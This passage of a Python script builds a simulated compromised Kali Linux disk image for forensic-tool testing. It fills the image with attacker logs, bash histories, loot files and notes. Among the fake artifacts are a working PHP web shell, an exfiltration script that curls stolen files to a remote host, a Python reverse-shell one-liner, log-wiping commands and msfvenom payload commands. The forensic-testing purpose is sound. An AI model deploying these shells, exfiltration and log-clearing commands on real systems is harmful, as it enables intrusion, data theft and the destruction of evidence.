2024-01-04 08:30:02 status installed wireshark:amd64 4.2.2-0kali1
2024-01-04 09:15:44 install sqlmap:all <none> 1.8.2-0kali1
2024-01-04 09:15:45 status installed sqlmap:all 1.8.2-0kali1
2024-01-05 07:00:11 startup archives unpack
2024-01-05 07:00:12 upgrade kali-linux-core:amd64 2023.4 2024.1
2024-01-05 07:00:30 status installed kali-linux-core:amd64 2024.1
2024-01-07 14:30:05 install john:amd64 <none> 1.9.0-jumbo-1+bleeding-amd64-3
2024-01-07 14:30:06 status installed john:amd64 1.9.0-jumbo-1+bleeding-amd64-3
2024-01-08 10:05:17 install hashcat:amd64 <none> 6.2.6+ds1-1
2024-01-08 10:05:18 status installed hashcat:amd64 6.2.6+ds1-1
""")

# Apache2 access and error log
w("/var/log/apache2/access.log", """\
192.168.56.1 - - [05/Jan/2024:09:00:01 +0000] "GET / HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
192.168.56.1 - - [05/Jan/2024:09:00:02 +0000] "GET /index.html HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (X11; Linux x86_64)"
10.10.14.5 - - [05/Jan/2024:10:33:17 +0000] "GET /phpinfo.php HTTP/1.1" 404 512 "-" "sqlmap/1.8.2 (https://sqlmap.org)"
10.10.14.5 - - [05/Jan/2024:10:33:18 +0000] "GET /admin/ HTTP/1.1" 403 287 "-" "sqlmap/1.8.2"
10.10.14.5 - - [05/Jan/2024:10:33:19 +0000] "GET /?id=1' HTTP/1.1" 200 1234 "-" "sqlmap/1.8.2"
10.10.14.5 - - [05/Jan/2024:10:33:20 +0000] "GET /?id=1'+AND+1=1-- HTTP/1.1" 200 1234 "-" "sqlmap/1.8.2"
10.10.14.5 - - [05/Jan/2024:10:33:21 +0000] "GET /wp-login.php HTTP/1.1" 404 512 "-" "curl/8.5.0"
192.168.56.100 - - [06/Jan/2024:14:22:04 +0000] "GET /shell.php HTTP/1.1" 200 28 "-" "Mozilla/5.0"
192.168.56.100 - - [06/Jan/2024:14:22:05 +0000] "GET /shell.php?cmd=id HTTP/1.1" 200 54 "-" "Mozilla/5.0"
192.168.56.100 - - [06/Jan/2024:14:22:06 +0000] "GET /shell.php?cmd=whoami HTTP/1.1" 200 54 "-" "Mozilla/5.0"
192.168.56.100 - - [06/Jan/2024:14:22:07 +0000] "GET /shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1543 "-" "Mozilla/5.0"
192.168.56.100 - - [06/Jan/2024:14:22:08 +0000] "GET /shell.php?cmd=cat+/etc/shadow HTTP/1.1" 403 289 "-" "Mozilla/5.0"
10.10.14.99 - - [07/Jan/2024:03:14:11 +0000] "POST /upload.php HTTP/1.1" 200 88 "-" "python-requests/2.31.0"
""")

w("/var/log/apache2/error.log", """\
[Sun Jan  5 00:00:01.000001 2024] [mpm_event:notice] [pid 1] AH00489: Apache/2.4.58 (Debian) configured -- resuming normal operations
[Sun Jan  5 10:33:19 2024] [error] [pid 1012] [client 10.10.14.5:52001] ModSecurity: Access denied with code 403 (phase 2). SQL injection detected [file "/etc/apache2/modsecurity.conf"]
[Mon Jan  6 14:22:05 2024] [warn] [pid 1115] [client 192.168.56.100:49823] script '/var/www/html/shell.php' not found or unable to stat
[Wed Jan  8 09:00:01 2024] [notice] [pid 1] AH00491: caught SIGTERM, shutting down
""")

# sudo log
w("/var/log/sudo.log", """\
Jan  5 08:31:17 2024 : kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/nmap -sV 192.168.56.0/24
Jan  5 08:45:22 2024 : kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/tcpdump -i eth0 -w /home/kali/capture.pcap
Jan  5 10:55:01 2024 : kali : TTY=pts/0 ; PWD=/opt/metasploit-framework ; USER=root ; COMMAND=/usr/bin/msfconsole -r /home/kali/scripts/autorun.rc
Jan  6 00:17:33 2024 : kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/bin/bash
Jan  7 14:30:09 2024 : john : TTY=pts/2 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/nmap -A 10.10.14.0/24
Jan  7 14:55:11 2024 : john : TTY=pts/2 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.102 http-post-form
Jan  8 09:30:44 2024 : kali : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/tcpdump -i eth1 port 4444
""")

# lastlog (binary-ish approximation as text for forensic parser)
w("/var/log/lastlog", "kali pts/0 192.168.56.1      Thu Jan  8 09:30:00 2024\nroot pts/1 10.10.14.99       Mon Jan  5 10:22:15 2024\njohn pts/2 192.168.56.1      Sun Jan  7 14:30:09 2024\n")

# wtmp (text representation)
w("/var/log/wtmp.txt", """\
kali    pts/0        192.168.56.1     Fri Jan  5 02:14:03 2024   still logged in
root    pts/1        10.10.14.99      Fri Jan  5 10:22:15 2024 - Fri Jan  5 12:00:00 2024
john    pts/2        192.168.56.1     Sat Jan  6 03:55:21 2024 - Sat Jan  6 06:00:00 2024
john    pts/2        192.168.56.1     Sun Jan  7 14:30:09 2024   still logged in
kali    pts/0        192.168.56.1     Mon Jan  8 09:30:00 2024   still logged in
""")

# Metasploit / MSF logs
os.makedirs(M + "/var/log/msf", exist_ok=True)
w("/var/log/msf/msf_update.log", """\
[2024-01-07 04:00:01] Starting Metasploit Framework update...
[2024-01-07 04:00:05] Connecting to updates.metasploit.com
[2024-01-07 04:01:33] Updated 147 modules
[2024-01-07 04:01:34] Updated exploit/windows/smb/ms17_010_eternalblue
[2024-01-07 04:01:34] Updated exploit/multi/handler
[2024-01-07 04:01:35] Updated post/windows/gather/credentials/credential_collector
[2024-01-07 04:01:35] Update complete. Version: 6.3.44
""")

# ─── /root home ───────────────────────────────────────────────────────────────

w("/root/.bashrc", """\
# ~/.bashrc: executed by bash(1) for non-login shells.
export HISTFILE=/root/.bash_history
export HISTSIZE=50000
export HISTFILESIZE=50000
export HISTTIMEFORMAT="%F %T "
HISTCONTROL=ignoredups:erasedups
shopt -s histappend
PROMPT_COMMAND="history -a; $PROMPT_COMMAND"

PS1='\\[\\e[0;31m\\]\\u@\\h\\[\\e[0m\\]:\\[\\e[1;34m\\]\\w\\[\\e[0m\\]\\$ '
alias ll='ls -alh'
alias la='ls -A'
alias nmap='nmap --reason'
alias msf='msfconsole -q'
export MSF_DATABASE_CONFIG=/opt/metasploit-framework/config/database.yml
""")

w("/root/.bash_history", """\
nmap -sn 192.168.56.0/24
nmap -sV -sC -p- 192.168.56.102
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
exploit -j
sessions -l
sessions -i 1
sysinfo
hashdump
upload /home/kali/.backdoor/winpersist.exe C:\\\\Windows\\\\Temp\\\\
cd /home/kali/loot
ls -la
cat hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 192.168.56.100 smb
python3 /opt/impacket/examples/secretsdump.py administrator:Password123@192.168.56.100
cat /etc/shadow
nc -lvnp 9001
tcpdump -i eth0 -w /tmp/cap.pcap
id
whoami
history
""")

w("/root/.bash_profile", """\
if [ -f ~/.bashrc ]; then
    . ~/.bashrc
fi
export PATH="$PATH:/opt/metasploit-framework:/opt/exploits"
""")

os.makedirs(M + "/root/.ssh", exist_ok=True)
w("/root/.ssh/authorized_keys", "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7xmN8FakeAuthorizedKeyForRootAccessForensicTesting kali@attacker\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeRootBackdoorKeyInstalledByAttacker root@kali\n", mode=0o600)
w("/root/.ssh/known_hosts", "192.168.56.100 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA6VTargetWindowsHostKey==\n10.10.14.5 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAttackerMachineKey==\n", mode=0o644)
os.chmod(M + "/root/.ssh", 0o700)

# loot directory
os.makedirs(M + "/root/loot", exist_ok=True)
w("/root/loot/hashes.txt", """\
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
john.doe:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
jane.smith:1002:aad3b435b51404eeaad3b435b51404ee:e52cac67419a9a224a3b108f3fa6cb6d:::
svc_backup:1003:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
""")

w("/root/loot/credentials.txt", """\
# Collected credentials — DO NOT SHARE
# Source: 192.168.56.100 (Windows server)
Administrator:Password123!
john.doe:Summer2023
jane.smith:Welcome1
svc_backup:Backup$2023
# Source: 192.168.56.102 (web app)
admin:admin123
webmaster:qwerty2024
""")

w("/root/loot/network_scan.txt", """\
Nmap scan report for 192.168.56.0/24
Host: 192.168.56.1  Status: Up  OS: Linux gateway
Host: 192.168.56.100 Status: Up  OS: Windows Server 2019
  PORT    STATE SERVICE       VERSION
  22/tcp  open  ssh           OpenSSH 7.9
  80/tcp  open  http          Apache 2.4.41
  135/tcp open  msrpc         Microsoft Windows RPC
  139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
  445/tcp open  microsoft-ds  Windows Server 2019 SMB
  3389/tcp open  ms-wbt-server Microsoft Terminal Services
Host: 192.168.56.101 Status: Up  OS: Kali Linux (this machine)
Host: 192.168.56.102 Status: Up  OS: Ubuntu 22.04
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.9p1
  80/tcp open  http    nginx 1.18.0
  3306/tcp open mysql  MySQL 8.0.35
""")

# ─── /home/kali ──────────────────────────────────────────────────────────────

os.makedirs(M + "/home/kali/.ssh", exist_ok=True)
os.makedirs(M + "/home/kali/scripts", exist_ok=True)
os.makedirs(M + "/home/kali/.backdoor", exist_ok=True)
os.makedirs(M + "/home/kali/tools", exist_ok=True)
os.makedirs(M + "/home/kali/targets", exist_ok=True)
os.makedirs(M + "/home/kali/captures", exist_ok=True)
os.makedirs(M + "/home/kali/wordlists", exist_ok=True)

w("/home/kali/.bashrc", """\
export HISTFILE=~/.bash_history
export HISTSIZE=50000
export HISTFILESIZE=50000
export HISTTIMEFORMAT="%F %T "
HISTCONTROL=ignoredups:erasedups
shopt -s histappend
PROMPT_COMMAND="history -a; $PROMPT_COMMAND"
PS1='\\[\\e[1;32m\\]kali@kali\\[\\e[0m\\]:\\[\\e[1;34m\\]\\w\\[\\e[0m\\]\\$ '
alias ll='ls -alhF --color=auto'
alias nse='ls /usr/share/nmap/scripts/'
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin:/opt/exploits
""")

w("/home/kali/.bash_history", """\
# 2024-01-05 02:14 — logged in via SSH
uname -a
id
sudo -l
ifconfig
ip addr
nmap -sn 192.168.56.0/24
nmap -sV -sC -O -p- 192.168.56.100 -oN targets/windows_scan.txt
nmap -sV -sC -O -p- 192.168.56.102 -oN targets/linux_scan.txt
sudo tcpdump -i eth0 -w captures/session1.pcap &
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.100
set LHOST 192.168.56.101
run
sessions
sessions -i 1
background
use post/multi/recon/local_exploit_suggester
run
use post/windows/gather/credentials/credential_collector
run
download C:\\\\Windows\\\\Repair\\\\SAM /root/loot/
# 2024-01-06 00:17 — cron trigger
bash scripts/daily_recon.sh
cat .recon.log
# 2024-01-08 09:30
sudo su -
""")

w("/home/kali/.bash_profile", "[ -f ~/.bashrc ] && . ~/.bashrc\n")

w("/home/kali/.ssh/id_rsa", """\
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAA fake_kali_private_key_for_forensic_image_testing
AAAAB3NzaC1yc2EAAAADAQABAAABgQCFakePrivateKeyForKaliUserForensicTesting123
NotARealKeyGeneratedForOSForensicsTestingToolPrototype2024Kali
-----END OPENSSH PRIVATE KEY-----
""", mode=0o600)

w("/home/kali/.ssh/id_rsa.pub", "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCFakePublicKeyForKaliUserForensicTesting123NotARealKeyGeneratedForOSForensicsTestingToolPrototype2024 kali@kali\n")

w("/home/kali/.ssh/authorized_keys", "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCFakePublicKeyForKaliUserForensicTesting123NotARealKeyGeneratedForOSForensicsTestingToolPrototype2024 kali@kali\n", mode=0o600)

w("/home/kali/.ssh/known_hosts", """\
192.168.56.100 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAWindowsTargetHostKey==
192.168.56.102 ecdsa-sha2-nistp256 AAAAE2VjZHNhLinuxTargetHostKey==
10.10.14.5 ecdsa-sha2-nistp256 AAAAE2VjZHNhAttackerCnCKey==
""")

os.chmod(M + "/home/kali/.ssh", 0o700)

# Scripts
w("/home/kali/scripts/daily_recon.sh", """\
#!/bin/bash
# Daily automated recon
DATE=$(date +%Y%m%d)
LOG="/home/kali/.recon.log"
echo "[+] Starting recon at $(date)" >> $LOG
nmap -sn 192.168.56.0/24 >> $LOG 2>&1
nmap -sV --open -p 22,80,443,445,3389 192.168.56.100 192.168.56.102 >> $LOG 2>&1
echo "[+] Recon complete at $(date)" >> $LOG
""", mode=0o755)

w("/home/kali/scripts/autorun.rc", """\
# Metasploit autorun resource script
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
set ExitOnSession false
exploit -j -z
""")

w("/home/kali/scripts/exfil.sh", """\
#!/bin/bash
# Data exfiltration helper
TARGET_DIR="/home/kali/loot"
REMOTE="192.168.56.200"
REMOTE_PORT=8080
echo "[*] Starting exfil at $(date)"
tar czf /tmp/exfil_$(date +%s).tgz $TARGET_DIR
curl -s -X POST -F "file=@/tmp/exfil_$(date +%s).tgz" http://$REMOTE:$REMOTE_PORT/upload
echo "[*] Exfil complete"
""", mode=0o755)

w("/home/kali/.backdoor/persist.sh", """\
#!/bin/bash
# Persistence mechanism — keep meterpreter alive
while true; do
    pgrep -x msfconsole > /dev/null || msfconsole -q -r /home/kali/scripts/autorun.rc &
    sleep 60
done
""", mode=0o755)

w("/home/kali/targets/windows_scan.txt", """\
# Nmap 7.94 scan initiated 2024-01-05 08:31:17 as: nmap -sV -sC -O -p- -oN targets/windows_scan.txt 192.168.56.100
Nmap scan report for 192.168.56.100
Host is up (0.00089s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 7.9 (protocol 2.0)
80/tcp    open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.3)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49664/tcp open  msrpc         Microsoft Windows RPC
OS details: Microsoft Windows Server 2019
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
""")

w("/home/kali/captures/README.txt", "PCAP captures from network monitoring.\nFiles: session1.pcap (eth0 dump Jan 5), session2.pcap (eth0 dump Jan 6)\n")

w("/home/kali/.recon.log", """\
[+] Starting recon at Sat Jan  6 00:17:34 2024
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.56.1 — Host is up
Nmap scan report for 192.168.56.100 — Host is up
Nmap scan report for 192.168.56.101 — Host is up (this host)
Nmap scan report for 192.168.56.102 — Host is up
[+] Recon complete at Sat Jan  6 00:17:56 2024
[+] Starting recon at Sun Jan  7 00:17:34 2024
Nmap scan report for 192.168.56.100 — Host is up (445 open: VULNERABLE TO MS17-010)
[+] Recon complete at Sun Jan  7 00:17:51 2024
""")

chown("/home/kali", 1000, 1000)
for dirpath, dirs, files in os.walk(M + "/home/kali"):
    for f in files:
        try: os.lchown(os.path.join(dirpath, f), 1000, 1000)
        except: pass
    for d in dirs:
        try: os.lchown(os.path.join(dirpath, d), 1000, 1000)
        except: pass

# ─── /home/john ──────────────────────────────────────────────────────────────

os.makedirs(M + "/home/john/.ssh", exist_ok=True)
os.makedirs(M + "/home/john/scripts", exist_ok=True)
os.makedirs(M + "/home/john/wordlists", exist_ok=True)
os.makedirs(M + "/home/john/notes", exist_ok=True)

w("/home/john/.bashrc", """\
export HISTFILE=~/.bash_history
export HISTSIZE=10000
export HISTTIMEFORMAT="%F %T "
shopt -s histappend
PS1='\\[\\e[1;33m\\]john@kali\\[\\e[0m\\]:\\w\\$ '
alias ll='ls -alhF'
""")

w("/home/john/.bash_history", """\
id
sudo -l
nmap -sn 192.168.56.0/24
sudo nmap -A 10.10.14.0/24
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.102 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
hydra -l administrator -P wordlists/common_passwords.txt 192.168.56.100 smb
enum4linux-ng -A 192.168.56.100
smbclient //192.168.56.100/C$ -U administrator
get SAM
get SYSTEM
exit
python3 /opt/impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes_nt.txt
hashcat -m 1000 hashes_nt.txt /usr/share/wordlists/rockyou.txt
cat notes/todo.txt
ls -la
history
""")

w("/home/john/.ssh/id_ed25519", """\
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAA fake_john_ed25519_private_key_forensic_testing_only
AAAAC3NzaC1lZDI1NTE5AAAAIFakeJohnEd25519KeyNotRealForOSForensicsTesting
-----END OPENSSH PRIVATE KEY-----
""", mode=0o600)

w("/home/john/.ssh/id_ed25519.pub", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeJohnEd25519KeyNotRealForOSForensicsTesting john@kali\n")

os.chmod(M + "/home/john/.ssh", 0o700)

w("/home/john/notes/todo.txt", """\
Targets:
- 192.168.56.100 (Windows Server 2019) — DONE: got Admin creds
- 192.168.56.102 (Ubuntu nginx+mysql) — IN PROGRESS
- 10.10.14.0/24 — scan pending

Tools to try:
- BloodHound for AD enumeration
- Responder for credential capture
- crackmapexec for lateral movement

Creds found:
  Administrator : Password123!
  john.doe : Summer2023
""")

w("/home/john/notes/methodology.txt", """\
Pentest Methodology
===================
1. Recon: nmap, enum4linux, nikto
2. Exploit: metasploit, manual PoC
3. Post-exploit: hashdump, credential_collector, mimikatz
4. Persistence: scheduled tasks, registry run keys
5. Exfil: smb, http POST to C2
6. Cleanup: clear event logs, remove artifacts
""")

chown("/home/john", 1001, 1001)
for dirpath, dirs, files in os.walk(M + "/home/john"):
    for f in files:
        try: os.lchown(os.path.join(dirpath, f), 1001, 1001)
        except: pass
    for d in dirs:
        try: os.lchown(os.path.join(dirpath, d), 1001, 1001)
        except: pass

# ─── /home/msfuser ───────────────────────────────────────────────────────────

os.makedirs(M + "/home/msfuser/.msf4", exist_ok=True)
os.makedirs(M + "/home/msfuser/payloads", exist_ok=True)
os.makedirs(M + "/home/msfuser/reports", exist_ok=True)

w("/home/msfuser/.bashrc", """\
export HISTFILE=~/.bash_history
export HISTSIZE=10000
export HISTTIMEFORMAT="%F %T "
PS1='\\[\\e[0;35m\\]msfuser@kali\\[\\e[0m\\]:\\w\\$ '
alias msf='msfconsole -q -r ~/.msf4/autorun.rc'
alias msfv='msfvenom'
""")

w("/home/msfuser/.bash_history", """\
msfconsole -q
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o payloads/win64_met.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f elf -o payloads/linux64_met.elf
msfvenom -p java/shell_reverse_tcp LHOST=192.168.56.101 LPORT=9001 -f war -o payloads/shell.war
ls -la payloads/
file payloads/win64_met.exe
python3 -m http.server 8888 &
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
exploit -j
sessions -l
sessions -i 1
getuid
getsystem
hashdump
run post/windows/gather/credentials/credential_collector
download C:\\\\Users\\\\Administrator\\\\Desktop\\\\secrets.txt
history
""")

w("/home/msfuser/.msf4/autorun.rc", """\
# Metasploit autorun for msfuser
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
set ExitOnSession false
run -j -z
""")

# Simulated payload metadata (not a real executable)
w("/home/msfuser/payloads/win64_met.exe.info", """\
File: win64_met.exe
Type: PE32+ executable (console) x86-64
Size: 307200 bytes
MD5:  d41d8cd98f00b204e9800998ecf8427e
SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709
Generated: 2024-01-07 10:00:01
Tool: msfvenom 6.3.44
Payload: windows/x64/meterpreter/reverse_tcp
LHOST: 192.168.56.101
LPORT: 4444
AV Evasion: none
Status: ACTIVE (session 1 active)
""")

w("/home/msfuser/reports/engagement_notes.txt", """\
Engagement: Internal Pentest 2024-01
Date: 2024-01-05 to 2024-01-08
Operator: msfuser

Compromised hosts:
- 192.168.56.100 (Windows Server 2019) — Full compromise, SYSTEM shell
  Method: EternalBlue (MS17-010) via Metasploit
  Session: meterpreter session 1
  Credentials obtained: Administrator hash, all local accounts

- 192.168.56.102 (Ubuntu) — Partial access, www-data shell
  Method: SQL injection via web app -> RCE
  Shell: reverse bash via /tmp/shell.php upload

Pivoting: used meterpreter routing to access 10.10.14.0/24
""")

chown("/home/msfuser", 1002, 1002)
for dirpath, dirs, files in os.walk(M + "/home/msfuser"):
    for f in files:
        try: os.lchown(os.path.join(dirpath, f), 1002, 1002)
        except: pass
    for d in dirs:
        try: os.lchown(os.path.join(dirpath, d), 1002, 1002)
        except: pass

# ─── /var/www (web shell evidence) ───────────────────────────────────────────

w("/var/www/html/index.html", """\
<!DOCTYPE html>
<html><head><title>Apache2 Debian Default Page</title></head>
<body>
<h1>Apache2 Default Page</h1>
<p>It works! This is the default welcome page for Apache2.</p>
</body></html>
""")

w("/var/www/html/shell.php", """\
<?php
// Webshell — uploaded by attacker 2024-01-06
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>
""")

w("/var/www/html/upload.php", """\
<?php
// Upload handler — part of C2 infrastructure
if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])){
    $target = '/var/www/html/uploads/' . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
    echo json_encode(['status'=>'ok','path'=>$target]);
}
?>
""")

# ─── /opt/metasploit-framework placeholder ───────────────────────────────────

w("/opt/metasploit-framework/VERSION", "6.3.44\n")
w("/opt/metasploit-framework/README", "Metasploit Framework 6.3.44\nKali-packaged version.\n")
os.makedirs(M + "/opt/metasploit-framework/config", exist_ok=True)
w("/opt/metasploit-framework/config/database.yml", """\
production:
  adapter: postgresql
  database: msf
  username: msf
  password: msf_password_2024
  host: 127.0.0.1
  port: 5432
  pool: 75
  timeout: 5
""")

# ─── /tmp artefacts ──────────────────────────────────────────────────────────

w("/tmp/cap.pcap.info", "PCAP capture from: tcpdump -i eth0 (Jan 5 08:45:22)\nSize: 24MB approx\nFilter: none — full traffic capture\n")
w("/tmp/.bash_history_backup", """\
# Recovered from /tmp — attacker tried to hide this
cat /etc/shadow
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.56.200",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
rm -rf /var/log/auth.log
echo "" > /var/log/syslog
history -c
""")
w("/tmp/linpeas.sh.info", "LinPEAS script downloaded from: https://github.com/carlospolop/PEASS-ng\nDownloaded by: kali (Jan 5 09:15:00)\nExecuted as: root\n")
w("/tmp/privesc_notes.txt", """\
LinPEAS output highlights:
[+] SUID binaries found: /usr/bin/passwd, /usr/bin/sudo, /usr/bin/pkexec
[!] CVE-2021-4034 (PwnKit) — pkexec may be vulnerable
[+] Writable /etc/passwd? NO
[+] Sudo version: 1.9.14p3 — not obviously vulnerable
[+] Cron jobs running as root — see /etc/crontab
""")

# ─── /etc/rc.local (persistence) ─────────────────────────────────────────────

w("/etc/rc.local", """\
#!/bin/sh -e
# rc.local — run at startup
# Start update-checker service (added 2024-01-06)
/usr/local/bin/update-checker &
# Ensure backdoor dir exists
mkdir -p /home/kali/.backdoor
exit 0
""", mode=0o755)

# ─── Miscellaneous forensic artifacts ────────────────────────────────────────

w("/var/log/service_monitor.log", """\
2024-01-05 00:05:01 [OK] apache2 running (pid 1022)
2024-01-05 00:05:01 [OK] ssh running (pid 1045)
2024-01-05 00:05:01 [OK] postgresql running (pid 1088)
2024-01-05 00:05:01 [WARN] update-checker not found — installing
2024-01-05 00:05:02 [OK] update-checker started (pid 1099)
2024-01-05 00:10:01 [OK] All services running
2024-01-05 10:20:00 [ALERT] Unusual outbound connection: 192.168.56.101:44444 -> 192.168.56.200:4444
""")

w("/var/log/backup.log", """\
2024-01-07 02:00:01 Backup started
2024-01-07 02:00:02 Backing up /etc /home /var/www
2024-01-07 02:01:15 Backup complete: /var/backups/config_20240107.tgz (45MB)
2024-01-08 02:00:01 Backup started
2024-01-08 02:01:22 Backup complete: /var/backups/config_20240108.tgz (46MB)
""")

os.makedirs(M + "/var/backups", exist_ok=True)
w("/var/backups/README", "Automated config backups. Files: config_YYYYMMDD.tgz\n")

# /proc-like entries (static, for parser testing)
os.makedirs(M + "/proc/1", exist_ok=True)
w("/proc/1/cmdline", "systemd\x00--system\x00--deserialize\x0021\x00")
w("/proc/1/status", """\
Name:   systemd
State:  S (sleeping)
Tgid:   1
Pid:    1
PPid:   0
Uid:    0 0 0 0
Gid:    0 0 0 0
VmRSS:  12345 kB
""")
os.makedirs(M + "/proc/self", exist_ok=True)

# ─── Fix permissions on sensitive dirs ───────────────────────────────────────

try:
    os.chmod(M + "/etc/shadow", 0o640)
    os.chmod(M + "/etc/gshadow", 0o640)
    os.chmod(M + "/etc/sudoers", 0o440)
    os.chmod(M + "/etc/sudoers.d/kali-grant", 0o440)
    os.chmod(M + "/tmp", 0o1777)
    os.chmod(M + "/var/spool/cron/crontabs", 0o730)
except Exception as e:
    print(f"[warn] chmod: {e}")

print("\n[✓] All forensic artifacts written.")
print(f"[✓] Mount point: {M}")

# Summary
import subprocess
result = subprocess.run(["du", "-sh", M], capture_output=True, text=True)
print(f"[✓] Image content size: {result.stdout.strip()}")
